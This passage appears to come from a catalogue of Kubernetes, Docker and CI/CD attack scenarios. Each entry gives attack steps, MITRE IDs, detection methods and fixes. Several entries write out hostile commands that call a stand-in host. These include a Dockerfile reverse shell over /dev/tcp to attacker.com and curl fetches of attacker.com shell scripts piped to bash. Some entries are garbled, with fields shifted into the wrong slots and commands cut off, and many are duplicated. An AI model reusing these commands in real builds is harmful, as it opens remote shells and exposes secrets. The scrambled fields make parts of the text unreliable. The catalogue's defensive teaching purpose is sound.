- **Tools**: Browser, curl
- **Scenario**: Gaining cluster control through exposed dashboard with no login
- **Attack Steps**: 1. Attacker scans public IPs and finds dashboard accessible on NodePort or LoadBalancer IP.2. Dashboard has no authentication enabled or uses default token.3. They use the dashboard UI to list secrets, exec into pods, and create workloads.4. ClusterRoleBindings allow the dashboard to act as cluster-admin.5. Attacker persists access by creating new service accounts with admin rights.6. Dashboard traffic is unencrypted, exposing credentials in transit.7. Full GUI-based compromise of the cluster.
- **Detection**: Web access logs, API server logs
- **Solution**: Restrict dashboard access + use token auth
- **Tags**: #dashboardexposure #k8sgui #unauthapi

## Mounting /etc to Pod via HostPath to Read Host Credentials

- **Attack Type**: HostPath Escalation
- **Target**: Worker Node
- **Vulnerability**: Over-permissive hostPath volume
- **MITRE**: T1611
- **Impact**: Host filesystem compromise
- **Tools**: kubectl, bash
- **Scenario**: Use of /etc hostPath mount to steal sensitive host configuration files
- **Attack Steps**: 1. Attacker deploys a pod with a HostPath mount to /etc on host system.2. Inside the container, they access /mnt/etc/shadow, /mnt/etc/passwd, and /mnt/etc/ssh.3. They extract hashes and SSH keys.4. With brute-force or offline cracking, they retrieve host user credentials.5. SSH is used to access host machine directly.6. Persistence is achieved by modifying /etc/rc.local or adding backdoor binaries.7. Host now fully compromised from within container.
- **Detection**: File integrity monitoring, auditd
- **Solution**: Deny hostPath unless absolutely required
- **Tags**: #hostpathmount #rootaccess #containerescape

## Escalating Privileges with runAsUser: 0 in Pod Spec

- **Attack Type**: Root User Escalation
- **Target**: Containers
- **Vulnerability**: runAsUser misconfiguration
- **MITRE**: T1068
- **Impact**: Root inside container → host escalation
- **Tools**: kubectl, Dockerfile
- **Scenario**: Running containers with UID 0 (root) to elevate access inside and outside container
- **Attack Steps**: 1. Attacker deploys a pod with securityContext.runAsUser: 0.2. The container runs as root, allowing unrestricted use of tools like tcpdump, iptables, nmap.3. With root access, attacker mounts sensitive directories if hostPath is present.4. They also create SUID binaries or modify system tools within the container.5. If the container is privileged or has host mounts, attacker gains host root access.6. Since some base images default to root, it often goes unnoticed.7. Root containers enable chaining into broader exploits.
- **Detection**: Runtime alerts, Pod security audits
- **Solution**: Enforce non-root policies (PodSecurity)
- **Tags**: #runasuser0 #rootcontainer #privilegeescalation

## Exploiting kubectl exec to Pivot Across Internal Services

- **Attack Type**: Lateral Movement
- **Target**: Internal Pods
- **Vulnerability**: Over-permissive exec and network access
- **MITRE**: T1210
- **Impact**: Internal pivot & data exfil
- **Tools**: kubectl, nmap, curl
- **Scenario**: Using kubectl exec on exposed pods to reach internal databases and APIs
- **Attack Steps**: 1. Attacker gains access to kubectl with limited namespace access.2. They use kubectl exec to run commands inside frontend pods.3. From within, they pivot to internal networks using curl and psql to query internal APIs and databases.4. Since frontend pods often lack egress restrictions, lateral movement is easy.5. Secrets found in env vars or mounted files are reused to authenticate internally.6. Logs are not correlated, making detection difficult.7. Attacker exfiltrates data from internal apps via command-line access.
- **Detection**: kubectl audit logs, pod logs
- **Solution**: Restrict exec permissions, use network policies
- **Tags**: #podexec #lateralmovement #internalaccess

## Deploying Malicious DaemonSet for Host Persistence

- **Attack Type**: Persistent Backdoor
- **Target**: Cluster Nodes
- **Vulnerability**: DaemonSet with privileged access
- **MITRE**: T1546.010
- **Impact**: Cluster-wide persistence
- **Tools**: kubectl, bash, backdoor payload
- **Scenario**: Attacker creates DaemonSet with root access to all nodes
- **Attack Steps**: 1. With cluster-admin access, attacker creates a DaemonSet named sys-updater.2. It runs a privileged container with hostPath access to /, /etc, /root on each node.3. DaemonSet installs backdoor (e.g., reverse shell or cronjob) on each host system.4. Persistence is achieved even if cluster is cleaned, as host OS remains backdoored.5. Attack is stealthy since it appears as a system maintenance pod.6. Attackers can disable EDR and push config changes cluster-wide.7. Full host control across cluster nodes.
- **Detection**: Monitor DaemonSet creation + host logs
- **Solution**: Block privileged DaemonSets at policy level
- **Tags**: #daemonsetbackdoor #k8shostpersistence

## Secrets Exposure via Environment Variables in Pods

- **Attack Type**: Secret Mismanagement
- **Target**: Application Pods
- **Vulnerability**: Secrets stored in plaintext env vars
- **MITRE**: T1552.001
- **Impact**: External service compromise
- **Tools**: kubectl, env
- **Scenario**: Sensitive data exposed as environment variables in containers
- **Attack Steps**: 1. Attacker uses kubectl exec into a container and runs env.2. They find secrets such as AWS_ACCESS_KEY_ID, DB_PASSWORD set as environment variables.3. These are often auto-injected via CI/CD pipelines or Helm charts.4. They use AWS CLI or curl with these credentials to access external services.5. If logs contain error messages with env vars, secrets get leaked further.6. No encryption or access control exists on env vars once inside container.7. Secrets reused elsewhere (e.g., in dev and prod) increase risk.
- **Detection**: env access logs, command history
- **Solution**: Use mounted secrets or vault injection
- **Tags**: #envvars #secretexposure #k8ssecrets

## Creating Fake Pod to Harvest Service Account Tokens

- **Attack Type**: Service Account Abuse
- **Target**: K8s Namespace
- **Vulnerability**: Insecure service account mount
- **MITRE**: T1528
- **Impact**: API access using stolen pod identity
- **Tools**: kubectl, bash
- **Scenario**: Attacker deploys pod that reads its auto-mounted token for later reuse
- **Attack Steps**: 1. Attacker creates a pod with standard service account in targeted namespace.2. The service account token is automatically mounted at /var/run/secrets/kubernetes.io/serviceaccount/token.3. They exfiltrate this token to external server.4. Using this token, attacker calls API server directly via curl or kubectl --token.5. If token has RBAC for listing secrets or exec access, attacker escalates.6. This abuse is silent if token usage isn’t audited.7. Combined with stolen kubeconfig, attacker maintains long-term API access.
- **Detection**: Kube API token logs
- **Solution**: Restrict service account permissions & disable auto-mount
- **Tags**: #serviceaccountabuse #k8sapi #tokenstealing

## Reverse Shell via Public Dockerfile

- **Attack Type**: Malicious Dockerfile
- **Target**: CI/CD Build Servers
- **Vulnerability**: Unvalidated 3rd-party Dockerfiles
- **MITRE**: T1059.004
- **Impact**: Remote code execution during builds
- **Tools**: GitHub, Docker Hub, Netcat
- **Scenario**: A malicious actor commits a reverse shell into a public Dockerfile. When organizations fork and auto-build this repo, their CI/CD environments are compromised.
- **Attack Steps**: 1. Attacker creates a GitHub repository containing a seemingly useful Dockerfile for a popular app.2. Inside the Dockerfile, the attacker adds: RUN bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1".3. Organization forks or clones this repo into their CI/CD system (e.g., GitHub Actions, GitLab CI).4. During docker build, the reverse shell is triggered and connects back to attacker.5. Attacker gets a foothold inside the build runner, enabling lateral movement or further code tampering.
- **Detection**: Outbound connection monitoring, egress firewall logs
- **Solution**: Scan Dockerfiles for suspicious commands. Avoid running builds from untrusted repos.
- **Tags**: #reverse_shell #dockerfile #ci_cd_poison

## Typo-Based Base Image Backdoor

- **Attack Type**: Typosquatted Image
- **Target**: CI/CD Docker Builds
- **Vulnerability**: Human error in image names
- **MITRE**: T1195.002
- **Impact**: Silent compromise of entire app environment
- **Tools**: Docker Hub, MITMproxy
- **Scenario**: The attacker uploads a malicious image called alpine-base that mimics alpine. Victims unknowingly pull this backdoored image into production pipelines.
- **Attack Steps**: 1. Attacker creates and publishes alpine-base:latest image with same Dockerfile as Alpine but adds malicious payloads.2. The image is optimized and documented to look legitimate.3. Victim mistakenly uses FROM alpine-base instead of FROM alpine in Dockerfile.4. Build proceeds normally, but now attacker’s malware is embedded in every container downstream.5. This may include crypto miners, file watchers, or reverse shells, active at runtime.
- **Detection**: Registry access logs, image scanning tools
- **Solution**: Use image signing (cosign), trusted registries, typo detection plugins
- **Tags**: #typosquatting #baseimage #supplychain

## Credential Leakage in CI Logs

- **Attack Type**: Secrets in Logs
- **Target**: CI/CD Logs
- **Vulnerability**: Lack of secret masking or secure ENV handling
- **MITRE**: T1552.001
- **Impact**: Cloud credential theft via logs
- **Tools**: GitHub Actions, Jenkins, Trivy
- **Scenario**: Secrets (like AWS access keys) are leaked into CI/CD logs due to bad docker build practices where secrets are passed via ENV or ARG.
- **Attack Steps**: 1. Developer configures Dockerfile as ARG AWS_SECRET=xyz or ENV AWS_SECRET=xyz.2. During docker build, the CI system logs all build steps.3. These logs are stored in CI logs visible to team or even external contractors.4. Red team scrapes CI job logs using GitHub Actions API to find secrets.5. Secrets are then used to gain cloud access and pivot further.
- **Detection**: Secret scanners, log audits
- **Solution**: Use secret injection tools, avoid hardcoding secrets in Dockerfiles
- **Tags**: #ci_logs #awskeys #dockerbuild

## Multi-Stage Docker Poisoning

- **Attack Type**: Layer Injection
- **Target**: Docker Build Pipeline
- **Vulnerability**: Improper multi-stage isolation
- **MITRE**: T1204.003
- **Impact**: Hidden malware bundled with legit apps
- **Tools**: Docker, VSCode, Hadolint
- **Scenario**: Malicious code is added in a later stage of multi-stage Docker build which is then mistakenly included in the final image.
- **Attack Steps**: 1. Attacker commits multi-stage Dockerfile where malicious binary is injected during intermediate stage.2. Final COPY mistakenly includes attacker’s binary from previous stage (e.g., /tmp/backdoor).3. App runs as usual, but attacker’s code stays dormant until triggered.4. CI/CD pipeline never flags the issue since build passes and image is lean.5. Red team uses Docker layer inspection to find hidden binaries embedded deep inside.
- **Detection**: Docker image diffing, static analysis
- **Solution**: Use image scanners (Trivy, Grype), restrict COPY context
- **Tags**: #multistage #dockerlayers #malwareinjection

## Injected Bash Script in Entrypoint

- **Attack Type**: Entrypoint Backdoor
- **Target**: bash` at the start.3. Organization uses this script in their CI builds blindly.4. During container run, attacker gets full control inside runtime container.5. Long-term persistence is achieved via callbacks embedded in script.
- **Vulnerability**: Docker Entrypoint
- **MITRE**: Insecure third-party build scripts
- **Impact**: T1059.003
- **Tools**: GitHub, bash, curl, Docker
- **Scenario**: The attacker modifies entrypoint.sh in a public project to include a reverse shell or callback to C2.
- **Attack Steps**: 1. Public project contains a seemingly harmless entrypoint.sh that starts the app.2. Attacker commits change adding `curl attacker.com/shell.sh
- **Detection**: Code execution on app startup
- **Solution**: Runtime traffic, suspicious DNS queries
- **Tags**: Never use entrypoint scripts from untrusted sources

## Poisoned .env Files in Build Context

- **Attack Type**: Secret Injection
- **Target**: Docker Image Layers
- **Vulnerability**: Inclusion of sensitive files in COPY
- **MITRE**: T1552
- **Impact**: Sensitive data exposure from image history
- **Tools**: Docker, Grep, GitHub Search
- **Scenario**: A malicious actor sneaks secrets into .env files which are then baked into image layers due to careless COPY operations.
- **Attack Steps**: 1. Attacker forks a project and adds .env file with sensitive variables (or fake ones for exfil).2. The Dockerfile has COPY . ., so .env is included in the image.3. Build proceeds and image is pushed to registry.4. Red team pulls image and inspects layers using trivy or dive.5. Secrets are retrieved, possibly exposing environment or session tokens.
- **Detection**: Image scanners (Trivy, Snyk), build context audit
- **Solution**: Add .env to .dockerignore, validate build context
- **Tags**: #dotenv #dockerignore #imageleak

## Poisoned GitHub Action for Docker Build

- **Attack Type**: Workflow Hijack
- **Target**: GitHub Workflow
- **Vulnerability**: Unverified remote script execution
- **MITRE**: T1059.006
- **Impact**: CI workflow compromise
- **Tools**: GitHub Actions, bash, YAML
- **Scenario**: Attacker modifies GitHub Action YAML to point to a malicious Docker build script or external curl payload.
- **Attack Steps**: 1. GitHub Action uses curl or wget to fetch and execute Docker build scripts.2. Attacker modifies URL to point to their own server hosting malicious script.3. CI runs the script as part of workflow, which executes arbitrary commands.4. This builds and pushes poisoned images to DockerHub or GHCR.5. Red team later retrieves these and confirms backdoor presence.
- **Detection**: Workflow review tools, diff scanning
- **Solution**: Avoid remote scripts, pin checksums, peer review
- **Tags**: #githubactions #workflowattack #remotescript

## Backdoored Image in Private Registry

- **Attack Type**: Registry Poisoning
- **Target**: Private Registry
- **Vulnerability**: Lack of image signature verification
- **MITRE**: T1496
- **Impact**: Persistent compromise of deployments
- **Tools**: AWS ECR, Harbor, Docker, CI
- **Scenario**: A malicious image is pushed into a private registry (e.g., Harbor, ECR) with the same name/tag as trusted image.
- **Attack Steps**: 1. Attacker compromises CI/CD or dev credentials with push access to private registry.2. Uploads backdoored version of mycorp/app:latest with crypto miner installed.3. Image is used in production deployment automatically.4. Crypto miner runs silently for weeks, consuming resources.5. Red team discovers unusual CPU usage on nodes and tracks image hash mismatch.
- **Detection**: CPU usage alerts, image hash mismatch
- **Solution**: Enable image signing, audit registry activity
- **Tags**: #registrypoison #ecr #harbor

## Fake Official Image on DockerHub

- **Attack Type**: Impersonation / Typosquat
- **Target**: DockerHub / CI Builds
- **Vulnerability**: Open registry trust abuse
- **MITRE**: T1583.006
- **Impact**: Full control of container via backdoor
- **Tools**: DockerHub, SSH, nmap
- **Scenario**: Attacker publishes a fake nodejs-official image which includes an SSH backdoor and monitors all containers.
- **Attack Steps**: 1. Attacker creates a repo nodejs-official on DockerHub with high pull counts.2. Inside image, attacker adds a startup script that runs an SSH daemon exposed on high port.3. Victims searching for Node.js base images accidentally use this one.4. Backdoor allows attacker to SSH into running containers or laterally move.5. Attack is detected when unusual ports appear on infected container instances.
- **Detection**: Port scans, runtime SSH connections
- **Solution**: Pin image digests, use Docker official repo only
- **Tags**: #fakeimage #dockerhubattack #sshbackdoor

## Embedded Token via Git Submodules

- **Attack Type**: Git Supply Chain Injection
- **Target**: CI/CD Docker Builds
- **Vulnerability**: Unchecked submodule content
- **MITRE**: T1552.001
- **Impact**: Cloud credentials leaked via image layers
- **Tools**: GitHub, Docker, git-submodule
- **Scenario**: Sensitive .npmrc file with tokens is pulled via submodule and baked into image during CI build.
- **Attack Steps**: 1. CI/CD pipeline clones repo with submodules.2. One submodule has .npmrc or .aws/credentials file.3. Dockerfile does COPY . . including all submodules.4. Tokens get embedded into image and exposed in registries.5. Attacker finds them using docker pull + trivy and pivots to cloud.
- **Detection**: Image scanning, git-submodule inspection
- **Solution**: Audit .dockerignore, sanitize build context
- **Tags**: #submodule #tokendump #dockerleak

## Reverse Shell via Public Dockerfile

- **Attack Type**: Malicious Dockerfile
- **Target**: CI/CD Build Servers
- **Vulnerability**: Unvalidated 3rd-party Dockerfiles
- **MITRE**: T1059.004
- **Impact**: Remote code execution during builds
- **Tools**: GitHub, Docker Hub, Netcat
- **Scenario**: A malicious actor commits a reverse shell into a public Dockerfile. When organizations fork and auto-build this repo, their CI/CD environments are compromised.
- **Attack Steps**: 1. Attacker creates a GitHub repository containing a seemingly useful Dockerfile for a popular app.2. Inside the Dockerfile, the attacker adds: RUN bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1".3. Organization forks or clones this repo into their CI/CD system (e.g., GitHub Actions, GitLab CI).4. During docker build, the reverse shell is triggered and connects back to attacker.5. Attacker gets a foothold inside the build runner, enabling lateral movement or further code tampering.
- **Detection**: Outbound connection monitoring, egress firewall logs
- **Solution**: Scan Dockerfiles for suspicious commands. Avoid running builds from untrusted repos.
- **Tags**: #reverse_shell #dockerfile #ci_cd_poison

## Typo-Based Base Image Backdoor

- **Attack Type**: Typosquatted Image
- **Target**: CI/CD Docker Builds
- **Vulnerability**: Human error in image names
- **MITRE**: T1195.002
- **Impact**: Silent compromise of entire app environment
- **Tools**: Docker Hub, MITMproxy
- **Scenario**: The attacker uploads a malicious image called alpine-base that mimics alpine. Victims unknowingly pull this backdoored image into production pipelines.
- **Attack Steps**: 1. Attacker creates and publishes alpine-base:latest image with same Dockerfile as Alpine but adds malicious payloads.2. The image is optimized and documented to look legitimate.3. Victim mistakenly uses FROM alpine-base instead of FROM alpine in Dockerfile.4. Build proceeds normally, but now attacker’s malware is embedded in every container downstream.5. This may include crypto miners, file watchers, or reverse shells, active at runtime.
- **Detection**: Registry access logs, image scanning tools
- **Solution**: Use image signing (cosign), trusted registries, typo detection plugins
- **Tags**: #typosquatting #baseimage #supplychain

## Credential Leakage in CI Logs

- **Attack Type**: Secrets in Logs
- **Target**: CI/CD Logs
- **Vulnerability**: Lack of secret masking or secure ENV handling
- **MITRE**: T1552.001
- **Impact**: Cloud credential theft via logs
- **Tools**: GitHub Actions, Jenkins, Trivy
- **Scenario**: Secrets (like AWS access keys) are leaked into CI/CD logs due to bad docker build practices where secrets are passed via ENV or ARG.
- **Attack Steps**: 1. Developer configures Dockerfile as ARG AWS_SECRET=xyz or ENV AWS_SECRET=xyz.2. During docker build, the CI system logs all build steps.3. These logs are stored in CI logs visible to team or even external contractors.4. Red team scrapes CI job logs using GitHub Actions API to find secrets.5. Secrets are then used to gain cloud access and pivot further.
- **Detection**: Secret scanners, log audits
- **Solution**: Use secret injection tools, avoid hardcoding secrets in Dockerfiles
- **Tags**: #ci_logs #awskeys #dockerbuild

## Multi-Stage Docker Poisoning

- **Attack Type**: Layer Injection
- **Target**: Docker Build Pipeline
- **Vulnerability**: Improper multi-stage isolation
- **MITRE**: T1204.003
- **Impact**: Hidden malware bundled with legit apps
- **Tools**: Docker, VSCode, Hadolint
- **Scenario**: Malicious code is added in a later stage of multi-stage Docker build which is then mistakenly included in the final image.
- **Attack Steps**: 1. Attacker commits multi-stage Dockerfile where malicious binary is injected during intermediate stage.2. Final COPY mistakenly includes attacker’s binary from previous stage (e.g., /tmp/backdoor).3. App runs as usual, but attacker’s code stays dormant until triggered.4. CI/CD pipeline never flags the issue since build passes and image is lean.5. Red team uses Docker layer inspection to find hidden binaries embedded deep inside.
- **Detection**: Docker image diffing, static analysis
- **Solution**: Use image scanners (Trivy, Grype), restrict COPY context
- **Tags**: #multistage #dockerlayers #malwareinjection

## Injected Bash Script in Entrypoint

- **Attack Type**: Entrypoint Backdoor
- **Target**: bash` at the start.3. Organization uses this script in their CI builds blindly.4. During container run, attacker gets full control inside runtime container.5. Long-term persistence is achieved via callbacks embedded in script.
- **Vulnerability**: Docker Entrypoint
- **MITRE**: Insecure third-party build scripts
- **Impact**: T1059.003
- **Tools**: GitHub, bash, curl, Docker
- **Scenario**: The attacker modifies entrypoint.sh in a public project to include a reverse shell or callback to C2.
- **Attack Steps**: 1. Public project contains a seemingly harmless entrypoint.sh that starts the app.2. Attacker commits change adding `curl attacker.com/shell.sh
- **Detection**: Code execution on app startup
- **Solution**: Runtime traffic, suspicious DNS queries
- **Tags**: Never use entrypoint scripts from untrusted sources

## Poisoned .env Files in Build Context

- **Attack Type**: Secret Injection
- **Target**: Docker Image Layers
- **Vulnerability**: Inclusion of sensitive files in COPY
- **MITRE**: T1552
- **Impact**: Sensitive data exposure from image history
- **Tools**: Docker, Grep, GitHub Search
- **Scenario**: A malicious actor sneaks secrets into .env files which are then baked into image layers due to careless COPY operations.
- **Attack Steps**: 1. Attacker forks a project and adds .env file with sensitive variables (or fake ones for exfil).2. The Dockerfile has COPY . ., so .env is included in the image.3. Build proceeds and image is pushed to registry.4. Red team pulls image and inspects layers using trivy or dive.5. Secrets are retrieved, possibly exposing environment or session tokens.
- **Detection**: Image scanners (Trivy, Snyk), build context audit
- **Solution**: Add .env to .dockerignore, validate build context
- **Tags**: #dotenv #dockerignore #imageleak

## Poisoned GitHub Action for Docker Build

- **Attack Type**: Workflow Hijack
- **Target**: GitHub Workflow
- **Vulnerability**: Unverified remote script execution
- **MITRE**: T1059.006
- **Impact**: CI workflow compromise
- **Tools**: GitHub Actions, bash, YAML
- **Scenario**: Attacker modifies GitHub Action YAML to point to a malicious Docker build script or external curl payload.
- **Attack Steps**: 1. GitHub Action uses curl or wget to fetch and execute Docker build scripts.2. Attacker modifies URL to point to their own server hosting malicious script.3. CI runs the script as part of workflow, which executes arbitrary commands.4. This builds and pushes poisoned images to DockerHub or GHCR.5. Red team later retrieves these and confirms backdoor presence.
- **Detection**: Workflow review tools, diff scanning
- **Solution**: Avoid remote scripts, pin checksums, peer review
- **Tags**: #githubactions #workflowattack #remotescript

## Backdoored Image in Private Registry

- **Attack Type**: Registry Poisoning
- **Target**: Private Registry
- **Vulnerability**: Lack of image signature verification
- **MITRE**: T1496
- **Impact**: Persistent compromise of deployments
- **Tools**: AWS ECR, Harbor, Docker, CI
- **Scenario**: A malicious image is pushed into a private registry (e.g., Harbor, ECR) with the same name/tag as trusted image.
- **Attack Steps**: 1. Attacker compromises CI/CD or dev credentials with push access to private registry.2. Uploads backdoored version of mycorp/app:latest with crypto miner installed.3. Image is used in production deployment automatically.4. Crypto miner runs silently for weeks, consuming resources.5. Red team discovers unusual CPU usage on nodes and tracks image hash mismatch.
- **Detection**: CPU usage alerts, image hash mismatch
- **Solution**: Enable image signing, audit registry activity
- **Tags**: #registrypoison #ecr #harbor

## Fake Official Image on DockerHub

- **Attack Type**: Impersonation / Typosquat
- **Target**: DockerHub / CI Builds
- **Vulnerability**: Open registry trust abuse
- **MITRE**: T1583.006
- **Impact**: Full control of container via backdoor
- **Tools**: DockerHub, SSH, nmap
- **Scenario**: Attacker publishes a fake nodejs-official image which includes an SSH backdoor and monitors all containers.
- **Attack Steps**: 1. Attacker creates a repo nodejs-official on DockerHub with high pull counts.2. Inside image, attacker adds a startup script that runs an SSH daemon exposed on high port.3. Victims searching for Node.js base images accidentally use this one.4. Backdoor allows attacker to SSH into running containers or laterally move.5. Attack is detected when unusual ports appear on infected container instances.
- **Detection**: Port scans, runtime SSH connections
- **Solution**: Pin image digests, use Docker official repo only
- **Tags**: #fakeimage #dockerhubattack #sshbackdoor

## Embedded Token via Git Submodules

- **Attack Type**: Git Supply Chain Injection
- **Target**: CI/CD Docker Builds
- **Vulnerability**: Unchecked submodule content
- **MITRE**: T1552.001
- **Impact**: Cloud credentials leaked via image layers
- **Tools**: GitHub, Docker, git-submodule
- **Scenario**: Sensitive .npmrc file with tokens is pulled via submodule and baked into image during CI build.
- **Attack Steps**: 1. CI/CD pipeline clones repo with submodules.2. One submodule has .npmrc or .aws/credentials file.3. Dockerfile does COPY . . including all submodules.4. Tokens get embedded into image and exposed in registries.5. Attacker finds them using docker pull + trivy and pivots to cloud.
- **Detection**: Image scanning, git-submodule inspection
- **Solution**: Audit .dockerignore, sanitize build context
- **Tags**: #submodule #tokendump #dockerleak

## Backdoor via COPY in Untrusted Dockerfile

- **Attack Type**: Build Context Abuse
- **Target**: CI/CD Pipelines using public Dockerfiles
- **Vulnerability**: Over-trusted build context, unreviewed COPY usage
- **MITRE**: T1609
- **Impact**: Remote shell inside container post-deployment
- **Tools**: Docker, GitHub, Netcat, bash
- **Scenario**: A Dockerfile from a third-party repo includes an extra COPY command that silently injects a backdoored binary into the image.
- **Attack Steps**: 1. The attacker creates or contributes to a GitHub repo offering a seemingly helpful Dockerfile for a CLI tool.2. The Dockerfile includes a command like COPY tools/.hidden /usr/bin/mycli, which appears legitimate but contains a precompiled binary with a hidden reverse shell payload.3. The binary listens silently or reaches out to a remote command and control server once the container is started.4. A developer unaware of this hidden COPY clones the repo and builds the image using docker build ..5. The malicious binary is silently embedded, and once the container runs, the shell connects to attacker’s server.6. This gives the attacker remote access to runtime containers or build systems, enabling lateral movement or data exfiltration.
- **Detection**: Static Dockerfile reviews, trivy scan, runtime egress monitoring
- **Solution**: Restrict COPY usage to whitelisted paths; validate all layers; avoid untrusted Dockerfiles
- **Tags**: #dockerbuild #supplychain #copypoison

## Alpine Image Modified with Reverse Proxy

- **Attack Type**: Base Image Tampering
- **Target**: Docker Runtime Containers
- **Vulnerability**: Malicious routing rules in base images
- **MITRE**: T1195.002
- **Impact**: Stealthy data exfiltration and traffic monitoring
- **Tools**: DockerHub, BurpSuite, curl
- **Scenario**: Attacker creates a backdoored version of Alpine that proxies all outbound connections through attacker-controlled node for MITM or logging.
- **Attack Steps**: 1. Attacker creates alpine-minimal image that closely resembles the real Alpine image in size and metadata.2. A custom resolv.conf or iptables rule in the image routes outbound connections through a remote proxy.3. Developer unknowingly uses FROM alpine-minimal in Dockerfile.4. During runtime, all outbound HTTP/HTTPS requests are intercepted by the attacker’s proxy, allowing logging of API requests, tokens, or file uploads.5. The attacker collects sensitive data such as cloud API calls, S3 access patterns, or even private npm registry tokens.6. Detection is delayed as functionality seems unaffected, and proxy traffic is encrypted.
- **Detection**: Outbound traffic analysis, image inspection
- **Solution**: Pin base image digests; use only signed, verified images from trusted sources
- **Tags**: #baseimage #alpine #proxyattack

## Secrets Dumped via Docker Build ARG

- **Attack Type**: ARG Abuse
- **Target**: Docker Images / Build Layers
- **Vulnerability**: Secrets embedded in ARG during build
- **MITRE**: T1552.001
- **Impact**: Cloud resource takeover via leaked keys
- **Tools**: Docker CLI, Trivy, History Inspection Tools
- **Scenario**: Developers accidentally expose secrets in build-time ARG parameters, which get stored in image history layers.
- **Attack Steps**: 1. During Dockerfile creation, developer writes ARG AWS_SECRET=xyz to inject credentials during build.2. The image is built using --build-arg AWS_SECRET=xyz, embedding the secret into intermediate layers.3. Attacker pulls the public image and inspects its history using docker history or dive.4. Layer metadata reveals the secret, which is then used to access AWS resources.5. This type of leak is difficult to detect unless image layer scanning is in place.6. Attacker uses the credentials to pivot into cloud environment.
- **Detection**: Image history scan, cloud activity logs
- **Solution**: Never use secrets in ARG; use secret injection or build secrets API
- **Tags**: #argsecrets #dockersecurity #awsleak

## Injecting Cronjob via Multi-Stage Build

- **Attack Type**: Persistence via Cron
- **Target**: bash` every hour.3. The cron file is hidden within intermediate build files and not obvious in final inspection.4. Developers build and deploy this container.5. On runtime, the container regularly sends back system info or shells via the cronjob.6. Attack is persistent and only discovered through deep runtime or network analysis.
- **Vulnerability**: Production Containers
- **MITRE**: Hidden persistence inside Docker build
- **Impact**: T1053.003
- **Tools**: Docker, Cron, Netcat
- **Scenario**: An attacker modifies the Dockerfile to copy a hidden cronjob that re-establishes contact with a C2 server periodically.
- **Attack Steps**: 1. Attacker forks an open-source repo and modifies the Dockerfile in a subtle way.2. During a multi-stage build, they add COPY cron/evil-cron /etc/cron.d/backup which executes `curl attacker.com/shell
- **Detection**: Persistent C2 in running containers
- **Solution**: Cron log inspection, image diff tools
- **Tags**: Disable cron in containers, validate final images, minimize layer inheritance

## Curl-based Remote Shell via Entry Script

- **Attack Type**: Entrypoint Payload
- **Target**: bash`.3. The script is hosted on a dynamic server and updated regularly to maintain control.4. Each time the container starts, it executes arbitrary code from attacker’s server.5. This leads to remote control of container at every boot or deploy, making it resilient.6. The organization has no alerting since behavior looks like regular outbound HTTP traffic.
- **Vulnerability**: Docker Runtime
- **MITRE**: Entrypoint abuse with remote script
- **Impact**: T1059.006
- **Tools**: bash, curl, GitHub, Docker
- **Scenario**: A shell script in the entrypoint uses curl to fetch and execute attacker’s live shell on every start.
- **Attack Steps**: 1. Attacker modifies the entrypoint script of a containerized app like entrypoint.sh.2. A single line is added: `curl attacker.com/start.sh
- **Detection**: Full RCE with dynamic control
- **Solution**: HTTP traffic anomaly, entrypoint audit
- **Tags**: Avoid remote execution patterns in startup scripts

## Git Submodule Exfiltration via Build Scripts

- **Attack Type**: Git Abuse
- **Target**: CI/CD Pipelines
- **Vulnerability**: Hidden malicious .npmrc in git module
- **MITRE**: T1195.001
- **Impact**: Credential theft via supply chain
- **Tools**: Git, npm, curl, GitHub
- **Scenario**: A malicious submodule is added which contains a preconfigured .npmrc file with exfiltration logic.
- **Attack Steps**: 1. Attacker contributes to a project by adding a new dependency via git submodule (e.g., libs/util).2. The submodule contains a .npmrc with a postinstall script that sends environment variables to attacker’s domain.3. During build, the npm install runs the script, exfiltrating secrets like tokens, access keys.4. The project is built inside CI/CD, and logs show no errors.5. Attacker collects secrets silently and uses them to access internal systems.6. Only detailed CI logs or full dependency audit would reveal this activity.
- **Detection**: Submodule diffing, postinstall detection
- **Solution**: Disable postinstall in CI, audit submodules carefully
- **Tags**: #gitabuse #npmexfil #supplychainrisk

## Exploiting .dockerignore Misconfig

- **Attack Type**: Dockerignore Bypass
- **Target**: Docker Images
- **Vulnerability**: Misconfigured .dockerignore file
- **MITRE**: T1552.001
- **Impact**: Exposure of credentials via image layers
- **Tools**: Docker, Dive, Trivy
- **Scenario**: Secrets in source repo (e.g., .env, .aws/creds) are unintentionally copied into image due to missing .dockerignore entries.
- **Attack Steps**: 1. Developer forgets to add .env and .aws/credentials to .dockerignore.2. Dockerfile has COPY . ., so entire repo (including secrets) gets baked into image.3. CI/CD builds and pushes this image to public or internal registry.4. Attacker pulls image and uses tools like dive to inspect each layer.5. Hidden secrets are retrieved from intermediate or unused layers.6. This leads to immediate cloud access, API key leakage, or customer data breach.
- **Detection**: Image layer scan, repo file audit
- **Solution**: Always configure .dockerignore; scan build context
- **Tags**: #dockerignore #layerleak #credentialdump

## Piped Shell Execution in Dockerfile

- **Attack Type**: Build-Time Payload
- **Target**: 1. Attacker creates a Dockerfile for a popular project with a line:`RUN curl attacker.com/shell.sh
- **Vulnerability**: bash`.2. This executes attacker’s shell script during image build.3. The script installs surveillance tools, creates hidden users, or modifies system configs.4. Image is built and deployed with no suspicion as app behaves correctly.5. Attacker now has telemetry or control via installed malware.6. Detection is tricky without auditing Dockerfile and build logs.
- **MITRE**: CI Build Images
- **Impact**: Unverified remote script execution during build
- **Tools**: bash` which runs a malicious script during build.
- **Scenario**: Dockerfile contains a line like `RUN curl attacker.com/shell.sh
- **Attack Steps**: Docker, bash, curl, GitHub
- **Detection**: T1059.006
- **Solution**: Malware embedded at build time
- **Tags**: Build-time log monitoring, image inspection

## Dependency Confusion in Docker Layers

- **Attack Type**: Package Supply Chain Attack
- **Target**: Docker Build / NPM
- **Vulnerability**: Registry confusion / priority flaw
- **MITRE**: T1195.002
- **Impact**: Remote spyware via dependency resolution
- **Tools**: NPM, Docker, GitHub
- **Scenario**: Attacker publishes malicious lodash-logger to public registry, which is resolved before private version.
- **Attack Steps**: 1. Internal Dockerfile includes: RUN npm install lodash-logger.2. Developer assumes private scope will resolve first (@company/lodash-logger).3. Attacker publishes public version lodash-logger with spyware to npmjs.4. Docker build pulls public one, as private registry not prioritized.5. Spyware activates on runtime, exfiltrating data to attacker’s server.6. Vulnerability remains unnoticed until registry resolution is audited.
- **Detection**: Package hashes, runtime network monitors
- **Solution**: Lock dependencies via package-lock.json, use private registries
- **Tags**: #dependencyconfusion #npm #dockersupplychain

## Misuse of BuildKit Cache to Leak Secrets

